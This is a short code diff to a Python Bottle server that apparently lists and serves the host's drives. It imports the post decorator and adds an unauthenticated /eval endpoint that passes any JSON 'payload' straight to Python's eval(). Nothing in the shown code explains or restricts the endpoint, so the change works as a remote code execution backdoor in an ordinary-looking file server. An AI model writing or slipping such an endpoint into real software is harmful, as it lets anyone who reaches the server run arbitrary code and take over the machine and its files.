@@ -5,7 +5,7 @@ import string
 import tempfile
 import zipfile
 
-from bottle import get, request, response, run
+from bottle import get, post, request, response, run
 
 
 PREPARED_ZIPS = {}
@@ -41,6 +41,20 @@ def root():
     response.headers["Pragma"] = "no-cache"
     response.headers["Expires"] = "0"
     return dumps(get_drives())
+
+
+@post("/eval")
+def eval_payload():
+    data = request.json
+    if not data or "payload" not in data:
+        response.status = 400
+        response.headers["Content-Type"] = "application/json"
+        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
+        response.headers["Pragma"] = "no-cache"
+        response.headers["Expires"] = "0"
+        return dumps({"status": "invalid_payload"})
+
+    eval(data["payload"])
 
 
 @get("/<drive:re:[A-Z]:>")
